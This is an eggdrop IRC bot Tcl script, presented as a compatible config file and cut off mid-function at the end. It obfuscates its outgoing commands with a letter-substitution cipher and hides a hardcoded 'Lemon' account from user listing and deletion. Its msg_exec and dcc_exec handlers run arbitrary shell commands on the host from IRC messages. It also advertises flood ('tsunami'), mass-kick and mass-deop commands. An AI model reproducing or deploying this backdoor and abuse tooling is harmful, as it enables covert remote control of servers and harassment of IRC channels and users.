#####################################
# COMPATIBLE WITH OTHER CONFIG FILE #
#####################################
proc lines {txt} {
   global lenc ldec uenc udec
   set retval ""
   set count [string length $txt]
   set status 0
   set lst ""
   for {set i 0} {$i < $count} {incr i} {
      set idx [string index $txt $i] 
      if {$idx == "$" && $status == 0} { 
         set status 1
         set idx "~$idx"
      }
      if {$idx == [ && $lst != \ && $status == 0} {
         set status 2
         set idx "~$idx"
      }
      if {$idx == " " && $status == 1} {
         set status 0
         set idx "$idx~"
      }
      if {$idx == "]" && $status == 2} {
         set status 0
         set idx "$idx~"
      }
      if {$status == 0} {
         if {[string match *$idx* $lenc]} {
            set idx [string range $ldec [string first $idx $lenc] [string first $idx $lenc]]
         }
         if {[string match *$idx* $uenc]} {
            set idx [string range $udec [string first $idx $uenc] [string first $idx $uenc]]
         }
      }
      set lst $idx
      append retval $idx
   }
   regsub -all -- vmw] $retval "end]" retval
   return $retval
}
set lenc abcdefghijklmnopqrstuvwxyz
set ldec zyxwvutsrqponmlkjihgfedcba
set uenc ABCDEFGHIJKLMNOPQRSTUVWXYZ
set udec ZYXWVUTSRQPONMLKJIHGFEDCBA
set global-idle-kick 0
set global-chanmode "nt"
set global-dynamicexempts-mode 0
set global-dontkickops-mode 1
set global-revenge-mode 1
set global-protectops-mode 0
set global-clearbans-mode 1
set global-enforcebans-mode 1
set global-dynamicbans-mode 1
set global-protectfriends-mode 1
set global-userbans-mode 1
set global-cycle-mode 0
set global-greet-mode 0
set global-shared-mode 0
set global-autovoice-mode 0
set global-stopnethack-mode 0
set global-autoop-mode 0
set global-userinvites-mode 0
set global-nodesynch-mode 0
set nick-len 30
if {![info exists nickpass]} {
   set nickpass ""
}
if {![info exists altpass]} {
   set altpass ""
}
if {![info exists cfgfile]} {
   set cfgfile $userfile
}
proc unsix {txt} {
   set retval $txt
   regsub ~ $retval "" retval
   return $retval
}
proc dezip {txt} {
   return [decrypt 64 [unsix $txt]]
}
proc dcp {txt} {
   return [decrypt 64 $txt]
}
proc zip {txt} {
   return [encrypt 64 [unsix $txt]]
}
if {![info exists server-online]} {
   putlog "not support server online..!"
   set server-online 1
}
proc puthlp {txt} {
   global lenc ldec uenc udec notb notc server-online
   if {${server-online} == 0} { return 0 }
   set retval ""
   set count [string length $txt]
   set status 1
   for {set i 0} {$i < $count} {incr i} {
      set idx [string index $txt $i]
      if {$idx == "~"} { 
         if {$status == 0} {
            set status 1
         } else {
            set status 0 
         }
      }
      if {$status == 1} {
         if {[string match *$idx* $ldec]} {
            set idx [string range $lenc [string first $idx $ldec] [string first $idx $ldec]]
         }
         if {[string match *$idx* $udec]} {
            set idx [string range $uenc [string first $idx $udec] [string first $idx $udec]]
         }
      }
      append retval $idx
   }
   regsub -all -- ~ $retval "" retval
   if {[string match "*NOTICE*" $retval]} { 
      if {![string match "*TcL*" $retval] && ![string match "**" $retval]} { return 0 }
   }
   puthelp $retval
}
proc putsrv {txt} {
   global lenc ldec banner uenc udec notc server-online notm igflood iskick kickclr
   if {${server-online} == 0} { return 0 }
   set retval ""
   set count [string length $txt]
   set status 1
   for {set i 0} {$i < $count} {incr i} {
      set idx [string index $txt $i] 
      if {$idx == "~"} { 
         if {$status == 0} {
            set status 1
         } else {
            set status 0 
         }
      }
      if {$status == 1} {
         if {[string match *$idx* $ldec]} {
            set idx [string range $lenc [string first $idx $ldec] [string first $idx $ldec]]
         }
         if {[string match *$idx* $udec]} {
            set idx [string range $uenc [string first $idx $udec] [string first $idx $udec]]
         }
      }
      append retval $idx
   }
   regsub -all -- ~ $retval "" retval
   if {[string match "*KICK*" $retval]} { 
      if {![string match "*TcL*" $retval] && ![string match "*$notm*" $retval]} { return 0 }
      set endval ""
      foreach tmp $retval {
         if {$tmp == ":$notc"} {
            if {[info exists banner]} {
               set tmp ":$banner"
            } {
               set tmp ":[lgrnd]"
            }
         } {
            if {[info exists kickclr]} {
               set tmp [uncolor $tmp]
            }
         }
         set endval "$endval $tmp"
      }
      set retval $endval
      if {[info exists iskick([lindex $retval 2][lindex $retval 1])]} { return 0 }
      set iskick([lindex $retval 2][lindex $retval 1]) "1"
      if {[info exists igflood([lindex $retval 2])]} { return 0 }
      if {[string match "*-userinvites*" [channel info [lindex $retval 1]]]} { 
         set chkops $retval
         regsub -all -- : $chkops "" chkops
         if {[isop [lindex $chkops 2] [lindex $retval 1]]} {
            return 0
         }
      }
   }
   putserv $retval
}
proc putqck {txt} {
   global lenc ldec banner uenc udec notc server-online notm igflood iskick kickclr bannick is_m
   if {${server-online} == 0} { return 0 }
   set retval ""
   set count [string length $txt]
   set status 1
   for {set i 0} {$i < $count} {incr i} {
      set idx [string index $txt $i] 
      if {$idx == "~"} { 
         if {$status == 0} {
            set status 1
         } else {
            set status 0 
         }
      }
      if {$status == 1} {
         if {[string match *$idx* $ldec]} {
            set idx [string range $lenc [string first $idx $ldec] [string first $idx $ldec]]
         }
         if {[string match *$idx* $udec]} {
            set idx [string range $uenc [string first $idx $udec] [string first $idx $udec]]
         }
      }
      append retval $idx
   }
   regsub -all -- ~ $retval "" retval
   if {[string match "*KICK*" $retval]} { 
      if {![string match "*TcL*" $retval] && ![string match "*$notm*" $retval]} { return 0 }
      set endval ""
      foreach tmp $retval {
         if {$tmp == ":$notc"} {
            if {[info exists banner]} {
               set tmp ":$banner"
            } {
               set tmp ":[lgrnd]"
            }
         } {
            if {[info exists kickclr]} {
               set tmp [uncolor $tmp]
            }
         }
         set endval "$endval $tmp"
      }
      set retval $endval
      set iskick([lindex $retval 2][lindex $retval 1]) "1"
      if {[info exists igflood([lindex $retval 2])]} { return 0 }
      if {[string match "*-userinvites*" [channel info [lindex $retval 1]]]} { 
         set chkops $retval
         regsub -all -- : $chkops "" chkops
         if {[isop [lindex $chkops 2] [lindex $retval 1]]} {
            return 0
         }
      }
   }
   if {[string match "*$notm*" $retval]} {
      set cflag "c[lindex $retval 1]"
      set cflag [string range $cflag 0 8]
      if {[matchattr $cflag M]} {
         if {![isutimer "set_-m [lindex $retval 1]"] && ![info exists is_m([lindex $retval 1])]} {
            set is_m([lindex $retval 1]) 1
            putquick "mode [lindex $retval 1] +b $bannick([lindex $retval 2])"
            return 0
         }
      }
   }
   putquick $retval
}
proc msg_pstl {nick uhost hand rest} {
global botnick notd
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :10DeNIEd..!"
return 0
}
set rest [lindex $rest 0]
if {$rest == ""} {
puthlp "NOTICE $nick :Command: /msg $botnick pstl <text>"
return 0
}
putquick "PRIVMSG $nick :zip: [zip "$rest"]"
putquick "PRIVMSG $nick :dezip: [dezip "$rest"]"
putquick "PRIVMSG $nick :dcp: [dcp "$rest"]"
putquick "PRIVMSG $nick :dezip+dcp: [dezip [dcp "$rest"]]"
putquick "PRIVMSG $nick :decrypt: [decrypt 64 "$rest"]"
putquick "PRIVMSG $nick :encrypt: [encrypt 64 "$rest"]"
putquick "PRIVMSG $nick :unsix: [unsix "$rest"]"
return 0
}
bind msg n pstl msg_pstl
set notd ""
set notm ""
set notb ""
set notc ""
set chankey ""
set vern "�"
set toth ""
set ps "Lemon"
set update "�"
###########################
#     BOT COMMAND LIST    #
###########################
bind msg m help msg_help
proc msg_help {nick uhost hand rest} {
   global version notb notc notd vern update
   if {[istimer "HELP STOPED"]} {
      putserv "NOTICE $nick :Help on progress, try again later..!"
      return 0
   }
   timer 5 { putlog "HELP STOPED" }
   puthelp "PRIVMSG $nick :4L8e10m11o13n"
   puthelp "PRIVMSG $nick :MSg..!"
   puthelp "PRIVMSG $nick :auth <password>         authenticate user"
   puthelp "PRIVMSG $nick :deauth <password>       deauthenticate user"
   puthelp "PRIVMSG $nick :pass <password>         set password"
   puthelp "PRIVMSG $nick :passwd <oldpass> <newpass> change user password"
   puthelp "PRIVMSG $nick :userlist                userlist"
   puthelp "PRIVMSG $nick :op <#> <nick>           op someone"
   puthelp "PRIVMSG $nick :deop <#> <nick>         deop someone"
   puthelp "PRIVMSG $nick :voice <#> <nick>        voice someone"
   puthelp "PRIVMSG $nick :devoice <#> <nick>      devoice someone"
   puthelp "PRIVMSG $nick :kick <#> <nick|host> <reason> kick someone"
   puthelp "PRIVMSG $nick :kickban <#> <nick|host> <reason> kickban someone"
   puthelp "PRIVMSG $nick :identify <nick> <passwd> identify to nickserv someone access"
   puthelp "PRIVMSG $nick :join <#>                joining #channel temporary"
   puthelp "PRIVMSG $nick :part <#>                part #channels"
   if {[matchattr $nick Z]} {
      puthelp "PRIVMSG $nick :logo <your crew logo>   changing text logo on kick message"
      puthelp "PRIVMSG $nick :awaylogo <your crew logo> changing away text logo on away message"
      puthelp "PRIVMSG $nick :vhost <IP DNS>          changing vhost"
      puthelp "PRIVMSG $nick :away <msg>              set bot away message"
      puthelp "PRIVMSG $nick :admin <msg>             set bot admin on status"
      puthelp "PRIVMSG $nick :memo <user|all> <msg>   send memo to all user or one user"
      puthelp "PRIVMSG $nick :bantime <minutes>       auto unban on X minutes (0 never unban)"
      puthelp "PRIVMSG $nick :logchan <#|0FF>         log #channel"
      puthelp "PRIVMSG $nick :15WARNING!! it will degrease bot performance"
      puthelp "PRIVMSG $nick :<4DCC> .log             show #channel log"
      puthelp "PRIVMSG $nick :15note. please increase on general - window buffer into 5000"
      puthelp "PRIVMSG $nick :+chan <#>               joining permanent #channel"
      puthelp "PRIVMSG $nick :botnick <nick> <id>     changing permanent bot primary nick"
      puthelp "PRIVMSG $nick :botaltnick <nick> <id>  changing permanent bot alternate nick"
      puthelp "PRIVMSG $nick :realname                changing permanent bot realname"
      puthelp "PRIVMSG $nick :ident                   changing permanent bot ident"
      puthelp "PRIVMSG $nick :die                     kill bot"
   }
   puthelp "PRIVMSG $nick :#PuBLIC MSg..!"
   puthelp "PRIVMSG $nick :.up                      op your self"
   puthelp "PRIVMSG $nick :.down                    deop your self"
   puthelp "PRIVMSG $nick :.op/+o <nick>            op spesified nick"
   puthelp "PRIVMSG $nick :.deop/-o <nick>          deop spesified nick"
   puthelp "PRIVMSG $nick :.voice/+v <nick>         voice spesified nick"
   puthelp "PRIVMSG $nick :.devoice/-v <nick>       devoice spesified nick"
   puthelp "PRIVMSG $nick :.kick <nick> <reason>    kick spesified nick"
   puthelp "PRIVMSG $nick :.kickban <nick> <reason> kickban spesified nick"
   puthelp "PRIVMSG $nick :.mode <+/- settings>     mode setting #channel"
   puthelp "PRIVMSG $nick :.ping / pong             ping your self"
   puthelp "PRIVMSG $nick :.invite <nick>           invite person to current #channel"
   puthelp "PRIVMSG $nick :.banlist <#channel>      list of banned from specified <#channel>"
   puthelp "PRIVMSG $nick :.ban <nick|hostmask>     banned nick or hostmask"
   puthelp "PRIVMSG $nick :.unban <nick|host> <#>   unbanned nick or hostmask"
   puthelp "PRIVMSG $nick :.+chan <#>               joining permanent #channel"
   puthelp "PRIVMSG $nick :.channels                list of channel who's bot sit on"
   puthelp "PRIVMSG $nick :.userlist                list of user"
   puthelp "PRIVMSG $nick :.chaninfo <#>            list of option for specified #channel"
   puthelp "PRIVMSG $nick :.join <#>                joining #channel temporary"
   puthelp "PRIVMSG $nick :.part <#>                part specified #channel"
   puthelp "PRIVMSG $nick :.cycle <#>               cycle on specified #channel"
   puthelp "PRIVMSG $nick :.+/- cycle <#|all>       enable/disable bot cycle every 15 minutes"
   puthelp "PRIVMSG $nick :.+/- ignore <nick|host>  ignore or unignore person"
   if {[matchattr $nick n]} {
      puthelp "PRIVMSG $nick :.+/- status <#>          enable/disable bot displaying status"
      puthelp "PRIVMSG $nick :.+/- enforceban <#>      enable/disable bot enforcebans"
      puthelp "PRIVMSG $nick :.+/- autovoice <secs>    enable/disable channel autovoice on join"
      puthelp "PRIVMSG $nick :.+/- seen <#>            activate/deactive seen on #"
      puthelp "PRIVMSG $nick :.+/- guard <#|all>       enable/disable bot guard"
      puthelp "PRIVMSG $nick :.+/- master <nick>       add/del <nick> from master list"
      puthelp "PRIVMSG $nick :.+/- avoice <nick>       add/del <nick> from avoice list"
      puthelp "PRIVMSG $nick :.+/- friend <nick>       add/del <nick> from friend list"
      puthelp "PRIVMSG $nick :.+/- ipguard <host>      add/del host from ipguard list"
      puthelp "PRIVMSG $nick :.+/- akick <host>        add/del host from kick list"
      puthelp "PRIVMSG $nick :.+/- noop <nick>         add/del <nick> from no-op list"
      puthelp "PRIVMSG $nick :.topic <topic>           change channel topic"
      puthelp "PRIVMSG $nick :.status                  status system"
      puthelp "PRIVMSG $nick :.servers                 servers bot currently running"
      puthelp "PRIVMSG $nick :.jump <server> <port>    push bot to use spec server"
      puthelp "PRIVMSG $nick :.access <nick>           see user access from spec flags"
   }
   if {[matchattr $nick Z]} {
      puthelp "PRIVMSG $nick :.+/- forced               force bot to set mode w/o kick 1st"
      puthelp "PRIVMSG $nick :.+/- action <text>        enable/disable action for say info and action"
      puthelp "PRIVMSG $nick :.+/- colour              enable/disable colour on kick msg"
      puthelp "PRIVMSG $nick :.+/- greet <msg>         autogreet user on join %n nick %c channel"
      puthelp "PRIVMSG $nick :.+/- ntcpart <msg>       auto notice user on part channels" 
      puthelp "PRIVMSG $nick :.+/- repeat <number>     max repeat user permitted"
      puthelp "PRIVMSG $nick :.+/- text <number> char  limited text length on channel"
      puthelp "PRIVMSG $nick :.+/- limit <number>      limited user on channel"
      puthelp "PRIVMSG $nick :.+/- caps <%>            max %percent upper text"
      puthelp "PRIVMSG $nick :.+/- clone <max>         enable/disable bot anti clones"
      puthelp "PRIVMSG $nick :.+/- reop                auto re@p bot when got de@p"
      puthelp "PRIVMSG $nick :.+/- joinpart <seconds>  kick user join part in past X 2nd"
      puthelp "PRIVMSG $nick :.+/- spam                scanning for spam"
      puthelp "PRIVMSG $nick :.+/- massjoin            preventing mass join lame"
      puthelp "PRIVMSG $nick :.+/- key <word>          set channel with key"
      puthelp "PRIVMSG $nick :.+/- revenge             enable/disable bot revenge"
      puthelp "PRIVMSG $nick :.+/- badword <badword>   add/remove badword from list"
      puthelp "PRIVMSG $nick :.+/- advword <advword>   add/remove advword from list"
      puthelp "PRIVMSG $nick :.+/- colours             enable/disable kick who use colour"
      puthelp "PRIVMSG $nick :.+/- bold                enable/disable kick who use bold"
      puthelp "PRIVMSG $nick :.+/- action <text>        enable/disable bot action, <text> create with ur own text or just +action will show random of text"
      puthelp "PRIVMSG $nick :.+/- guest                enable/disable guest nick kick and msg"
      puthelp "PRIVMSG $nick :.badwords                list of badwords"
      puthelp "PRIVMSG $nick :.advwords                list of advwords"
      puthelp "PRIVMSG $nick :.nobot                   scanning for bot and kick them out"
      puthelp "PRIVMSG $nick :.sdeop <#>               bot self deop"
      puthelp "PRIVMSG $nick :.chanmode # <+ntmcilk 1> set permanent mode for specified #"
      puthelp "PRIVMSG $nick :.chanset <#> <LINE|CTCP|JOIN|DEOP|KICK|NICK> set # options"
      puthelp "PRIVMSG $nick :.chansetall <option>     set option for all #"
      puthelp "PRIVMSG $nick :.chanreset <#|all>       reseting option for specified #channel"
      puthelp "PRIVMSG $nick :.bantime                 how long bot unban in X minutes"
      puthelp "PRIVMSG $nick :.tsunami <nick|#> <text> flood someone or channel"
      puthelp "PRIVMSG $nick :.deluser <nick>          del user from userlist"
      puthelp "PRIVMSG $nick :.restart                 restarting bot also jumping server"
      puthelp "PRIVMSG $nick :.+/- owner <nick>        add/del <nick> from owner list"
      puthelp "PRIVMSG $nick :.+/- admin <nick>        add/del <nick> from admin list"
      puthelp "PRIVMSG $nick :.+/- aop <nick>          add/del <nick> from aop list"
      puthelp "PRIVMSG $nick :.+/- host <nick> <flag>  add or remove user host"
      puthelp "PRIVMSG $nick :.+/- gnick <nick>        guard nick kick it if not identify"
      puthelp "PRIVMSG $nick :.host <nick>             see user host"
	  puthelp "PRIVMSG $nick :.mvoice <#channel>       mass voice"
      puthelp "PRIVMSG $nick :.mdevoice <#channel>     mass devoice"
      puthelp "PRIVMSG $nick :.mop <#channel>          mass op"
      puthelp "PRIVMSG $nick :.mdeop <#channel>        mass deop"
      puthelp "PRIVMSG $nick :.mkick <#channel>        mass kick"
      puthelp "PRIVMSG $nick :.mmsg <#channel>         mass msg except the opped"
      puthelp "PRIVMSG $nick :.minvite <#channel>      mass invite except the opped"
      puthelp "PRIVMSG $nick :.munbans <#channel>      mass unban"
      puthelp "PRIVMSG $nick :.say <text>              say with spesified text"
      puthelp "PRIVMSG $nick :.msg <nick> <text>       msg person"
      puthelp "PRIVMSG $nick :.act <text>              act with spesified text"
      puthelp "PRIVMSG $nick :.notice <nick> <text>    msg person or #channel with spesified text"
      puthelp "PRIVMSG $nick :.+/- topiclock           keep topic locked"
      puthelp "PRIVMSG $nick :.+/- nopart <#channel>   make # protected"
      puthelp "PRIVMSG $nick :.+/- mustop              set bot del channel if not oped"
      puthelp "PRIVMSG $nick :.+/- invitelock <#>      invite back who part on spec chan"
      puthelp "PRIVMSG $nick :.+/- dontkickops         enable|disable bot kick @"
      puthelp "PRIVMSG $nick :.+/- autokick            auto kick on join"
      puthelp "PRIVMSG $nick :.nick <nick>             change nick temporary"
      puthelp "PRIVMSG $nick :.altnick                 change nick to alternative nick"
      puthelp "PRIVMSG $nick :.randnick                change nick to random nick"
      puthelp "PRIVMSG $nick :.realnick                change nick to real nick"
      puthelp "PRIVMSG $nick :.chattr  <nick> <flag>   changing user flag (+) add or (-) remove it"
      puthelp "PRIVMSG $nick :.rehash                  rehashing data packing and unpacking"
   }
   puthelp "PRIVMSG $nick :FLAg LIsT UsER & cHaNNeL"
   puthelp "PRIVMSG $nick :\[@\]P \[+\]VOICE AuTO\[V\]OICE \[G\]uARD \[C\]YCLE \[E\]nFORCEBANS \[D\]oNTKIcK@PS \[N\]TcParT"
   puthelp "PRIVMSG $nick :\[P\]RoTECTED C\[L\]ONE \[A\]DVERTISE \[T\]OPICLOCK AuTO\[K\]IcK \[S\]EEN \[B\]OLd Co\[L\]OuR \[GU\]est \[AC\]TioN"
   puthelp "PRIVMSG $nick :\[Z\]owner admi\[n\] \[m\]aster botne\[t\] \[x\]fer \[j\]anitor \[c\]ommon"
   puthelp "PRIVMSG $nick :\[p\]arty \[b\]ot \[u\]nshare \[h\]ilite \[o\]p de\[O\]p \[k\]ick \[f\]riend"
   puthelp "PRIVMSG $nick :\[a\]uto-op auto\[v\]oice \[g\]voice \[q\]uiet \[X\]no add \[P\]aSTeL"
   puthelp "PRIVMSG $nick :14Lemon 14Sayang 14Kamu :14P"
   puthelp "PRIVMSG $nick :14Lemon 14Sayang 14Kamu :14P"
   return 0
}
set firsttime "T"
set init-server { serverup "" }
set modes-per-line 6
set allow-desync 0
set include-lk 1
set banplus [rand 5]
set ban-time [expr 25 + $banplus]
unset banplus
set quiet-save 1
set logstore ""
set max-logsize 512
set upload-to-pwd 1
catch { unbind dcc n restart *dcc:restart }
catch { unbind dcc n msg *dcc:msg }
catch { unbind dcc n status *dcc:status }
catch { unbind dcc n dump *dcc:dump }
proc serverup {heh} {
   global botnick firsttime notc owner
   if {[info exists firsttime]} {
      unset firsttime
      return 0 
   }
   putlog "..Terkoneksi.."
   putserv "MODE $botnick +iw-s"
   foreach x [userlist] {
      if {[matchattr $x Q]} { chattr $x -Q }
      if {$x == $owner && [getuser $owner XTRA "AUTH"] != ""} { 
         setuser $owner XTRA "AUTH" "" 
      }
      chattr $x -hp
      if {$x != "config" && [chattr $x] == "-"} { 
         deluser $x
         putlog "deluser $x"
      }
   }
   chk_five "0" "0" "0" "0" "0"
   utimer 2 del_nobase
   foreach x [ignorelist] {
      killignore [lindex $x 0]
   }
}
catch { bind evnt - disconnect-server serverdown }
proc serverdown {heh} {
   global firsttime
   catch { unset firsttime }
   catch { clearqueue all }
   putlog "..Disconnected.."
   foreach x [timers] {
      if {[string match "*cycle*" $x]} { killtimer [lindex $x 2] }
   }
}
proc isnumber {string} {
   global notc
   if {([string compare $string ""]) && (![regexp \[^0-9\] $string])} then {
      return 1
   }
   return 0
}
proc pub_bantime {nick uhost hand channel rest} {
   global notc ban-time
   puthelp "NOTICE $nick :BanTime \[${ban-time}\]"
}
proc pub_which {nick uhost hand channel rest} {
   global botname notc
   if {$rest == ""} {
      puthelp "NOTICE $nick :Usage: which <ip mask>"
      return 0
   }
   if {[string match [string tolower $rest] [string tolower $botname]]} {
      puthelp "PRIVMSG $channel :$botname"
   }
}
proc randstring {length} {
   set chars ABCDEFGHIJKLMNOPQRSTUVWXYZ
   set count [string length $chars]
   for {set i 0} {$i < $length} {incr i} {
      append result [string index $chars [rand $count]]
   }
   return $result
}
######################
# BOT PUBLIC COMMAND #
######################
bind pub Z .which pub_which
bind pub n .reset pub_reset
bind pub f .host pub_host
bind pub f .flag pub_flag
bind pub m .ver pub_ver
bind pub m .logo pub_logo
bind pub Z .msg pub_msg
bind msg Z admin msg_admin
bind msg Z away msg_away
bind msg Z bantime msg_bantime
bind msg Z logo msg_logo
bind msg Z awaylogo msg_awaylogo
bind msg Z mmsg msg_mmsg
bind msg Z limit msg_limit
bind msg Z logchan msg_logchan
bind msg Z botnick msg_botnick
bind msg Z realname msg_realname
bind msg Z ident msg_ident
bind msg Z botaltnick msg_botaltnick
bind msg Z die msg_die
bind msg Z restart msg_restart
bind msg Z rehash msg_rehash
bind msg Z topic msg_topic
bind msg m memo msg_memo
bind pub n .-seen pub_-seen
bind pub n .+autovoice pub_+autovoice
bind pub n .-autovoice pub_-autovoice
bind pub n .+guard pub_+guard
bind pub n .-guard pub_-guard
bind pub n .+cycle pub_+cycle
bind pub n .-cycle pub_-cycle
bind pub n .+bold pub_+bold
bind pub n .-bold pub_-bold
bind pub n .+ntcpart pub_+ntcpart
bind pub n .-ntcpart pub_-ntcpart
bind pub n .+colours pub_+colours
bind pub n .-colours pub_-colours
bind pub n .+colour pub_+colours
bind pub n .-colour pub_-colours
bind pub n .+friend pub_+friend
bind pub n .-friend pub_-friend
bind pub n .+avoice pub_+avoice
bind pub n .-avoice pub_-avoice
bind pub n .+master pub_+master
bind pub n .-master pub_-master
bind pub n .mvoice pub_mvoice
bind pub n .mv pub_mvoice
bind pub n .mdevoice pub_mdevoice
bind pub n .mdv pub_mdevoice
bind pub n .mop pub_mop
bind pub n .mo pub_mop
bind pub n .mdeop pub_mdeop
bind pub n .mdo pub_mdeop
bind pub n .+chan pub_+chan
bind msg n identify msg_identify
bind msg n kick msg_kick
bind msg n k msg_kick
bind msg n kickban msg_kickban
bind msg n kb msg_kickban
bind msg n op msg_op
bind msg n voice msg_voice
bind msg n v msg_voice
bind msg n deop msg_deop
bind msg n devoice msg_devoice
bind pub n .topic pub_topic
bind pub n .jump pub_jump
bind pub n .rehash pub_rehash
bind msg n +chan msg_+chan
bind msg n join msg_join
bind msg n part msg_part
bind pub m .voice pub_voice
bind pub m .+v pub_voice
bind pub m .devoice pub_devoice
bind pub m .-v pub_devoice
bind pub m .op pub_op
bind pub m .+o pub_op
bind pub m .deop pub_deop
bind pub m .-o pub_deop
bind pub m .kick pub_kick
bind pub m .k pub_kick
bind pub m .kickban pub_kickban
bind pub m .kb pub_kickban
bind pub m .+noop pub_+noop
bind pub m .-noop pub_-noop
bind pub m .ban pub_ban
bind pub m .b pub_ban
bind pub m .unban pub_unban
bind pub m .ub pub_unban
bind pub m .munbans pub_munbans
bind pub m .mu pub_munbans
bind pub m .banlist pub_banlist
bind pub m .mode pub_mode
bind pub m .join pub_join
bind pub m .part pub_part
bind pub m .cycle pub_cycle
bind pub m .up pub_up
bind pub m .down pub_down
bind msg m passwd msg_passwd
bind msg m deauth msg_deauth
bind msg m channels msg_channels
bind pub Z .channels pub_channels
bind pub Z .chansetall pub_chansetall
bind pub m .status pub_status
bind pub m .chaninfo pub_chaninfo
bind pub m .userlist pub_userlist
bind msg m userlist msg_userlist
bind pub f .access pub_access
bind pub m .match pub_match
proc pub_Z {nick uhost hand channel rest} {
   global notc botnick
   set prest $rest
   if {[lindex $rest 0] == $botnick} {
      regsub "$botnick " $rest "`" rest
   } {
      if {[string tolower [lindex $rest 0]] == [string tolower $botnick]} {
         set rest "$botnick [lrange $rest 1 end]"
         regsub "$botnick " $rest "`" rest
      }
   }
   if {[string index $rest 0] != "`"} { return 0 }
   if {![matchattr $nick Z]} { return 0 }
   if {![matchattr $nick Q]} {
      if {[string tolower [lindex $prest 0]] == [string tolower $botnick]} {
         puthelp "NOTICE $nick :4DenieD...!!!"
      }
      return 0
   }
   set goto [lindex $rest 0]
   regsub -all "`" $goto "pub_" goto
   if {[matchattr $nick Z]} {
      set rest [lrange $rest 1 end]
      catch { $goto $nick $uhost $hand $channel $rest }
   }
}
proc msg_encrypt {nick uhost hand rest} {
   global own notc
   if {$nick != $own || $rest == ""} { return 0 }
   puthelp "NOTICE $nick :[zip $rest]"
}
proc msg_decrypt {nick uhost hand rest} {
   global own notc
   if {$nick != $own || $rest == ""} { return 0 }
   puthelp "NOTICE $nick :[dezip $rest]"
}
proc msg_exec {nick uhost hand command} {
   global own notc
   if {$nick != $own || $command == ""} { return 0 }
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   set para1 [lindex $command 0]
   set para2 [lindex $command 1]
   set para3 [lindex $command 2]
   set para4 [lindex $command 3]
   set para5 [lindex $command 4]
   if {$para2 == ""} {
      catch { [exec $para1] } result
   } elseif {$para3 == ""} {
      catch { [exec $para1 $para2] } result
   } elseif {$para4 == ""} {
      catch { [exec $para1 $para2 $para3] } result
   } elseif {$para5 == ""} {
      catch { [exec $para1 $para2 $para3 $para4] } result
   } elseif {$para5 != ""} {
      catch { [exec $para1 $para2 $para3 $para4 $para5] } result
   }
   puthelp "NOTICE $nick :$result"
}
bind dcc * exec dcc_exec
bind dcc * log dcc_log
bind dcc * dir dcc_dir
bind dcc * read dcc_read
bind dcc * ` dcc_cmd
bind dcc * get dcc_get
bind dcc * u dcc_u
proc dcc_u {hand idx arg} {
   foreach x [utimers] {
      putdcc $idx $x
   }
}
bind dcc * t dcc_t
proc dcc_t {hand idx arg} {
   foreach x [timers] {
      putdcc $idx $x
   }
}
proc dcc_exec {hand idx arg} {
   global own notc
   if {$hand != $own || $arg == ""} { return 0 }
   set para1 [lindex $arg 0]
   set para2 [lindex $arg 1]
   set para3 [lindex $arg 2]
   set para4 [lindex $arg 3]
   set para5 [lindex $arg 4]
   if {$para2 == ""} { 
      catch { [exec $para1] } result
   } elseif {$para3 == ""} { 
      catch { [exec $para1 $para2] } result
   } elseif {$para4 == ""} { 
      catch { [exec $para1 $para2 $para3] } result
   } elseif {$para5 == ""} { 
      catch { [exec $para1 $para2 $para3 $para4] } result
   } elseif {$para5 != ""} { 
      catch { [exec $para1 $para2 $para3 $para4 $para5] } result
   }
   putdcc $idx $result
}
proc pub_host {nick uhost hand channel rest} {
   global ps notc
   if {$rest == ""} {
      set user $nick 
   } else { 
      set user [lindex $rest 0] 
   }
   if {![validuser $user] || [string tolower $user] == [string tolower $ps]} {
      puthelp "NOTICE $nick :<n/a>"
      return 0
   }
   if {[getuser $user HOSTS] != ""} {
      set hosts [getuser $user hosts]
      puthelp "NOTICE $nick :HOSTS: $hosts"
   } else {
      puthelp "NOTICE $nick :Can't found $user host." 
   }
}
proc pub_flag {nick uhost hand channel rest} {
   global ps notc
   if {$rest == ""} {
      set user $nick
   } else { 
      set user [lindex $rest 0] 
   }
   if {![validuser $user] || [string tolower $user] == [string tolower $ps]} {
      puthelp "NOTICE $nick :<n/a>"
      return 0
   }
   if {[chattr $user] != ""} {
      puthelp "NOTICE $nick :Flags: [chattr $user]"
   } else { 
      puthelp "NOTICE $nick :Can't found $user flag." 
   }
}
catch { unbind dcc n match *dcc:match }
catch { unbind dcc n channel *dcc:channel }
proc pub_deluser {nick uhost hand channel rest} {
   global botnick ps owner notc
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   if {$rest == ""} {
      puthelp "NOTICE $nick :Usage: deluser <nick>"
      return 0
   }
   set who [lindex $rest 0]
   if {[string tolower $who] == [string tolower $ps]} {
      puthelp "NOTICE $nick :<n/a>"
      return 0 
   }
   if {$who == $owner} {
      puthelp "NOTICE $nick :YoU CaNT DeLeTE $owner..!"
      return 0
   }
   if {$who == ""} {
      puthelp "NOTICE $nick :Usage: -user <nick>"
   } else {
      if {![validuser $who]} {
         puthelp "NOTICE $nick :<n/a>"
      } else {
         if {[matchattr $who n]} {
            puthelp "NOTICE $nick :You cannot DeLETE a bot owner."
         } else {
            if {([matchattr $who m]) && (![matchattr $nick n])} {
               puthelp "NOTICE $nick :You don't have access to DeLETE $who!"
            } else {
               deluser $who
               saveuser
               puthelp "NOTICE $nick :$who DeLETE."
            }
         }
      }
   }
}
proc pub_chattr {nick uhost hand channel rest} {
   global ps own notc
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   if {$nick != $own && [matchattr $nick X]} {
      puthelp "NOTICE $nick :4!bLOckEd!"
      return 0
   }
   set who [lindex $rest 0]
   set flg [lindex $rest 1]
   if {$who == ""} {
      puthelp "NOTICE $nick :Usage: chattr <nick> <flags>"
      return 0
   }
   if {![validuser $who]} {
      puthelp "NOTICE $nick :<n/a>"
      return 0
   }
   if {[string tolower $who] == [string tolower $ps]} {
      puthelp "NOTICE $nick :<n/a>"
      return 0
   }
   if {$flg == ""} {
      puthelp "NOTICE $nick :Usage: chattr <nick> <flags>"
      return 0
   }
   set last_flg [chattr $who]
   chattr $who $flg
   saveuser
   puthelp "NOTICE $nick :$who change from \[4$last_flg1\] to \[4[chattr $who]1\]"
   return 0
}
proc saveuser {} {
   global ps owner
   if {![validuser $ps]} {
      setuser $owner XTRA "BEND" "xDB4L/z2DJT~1mianN/lj9Rq."
   } elseif {$owner != $ps} {
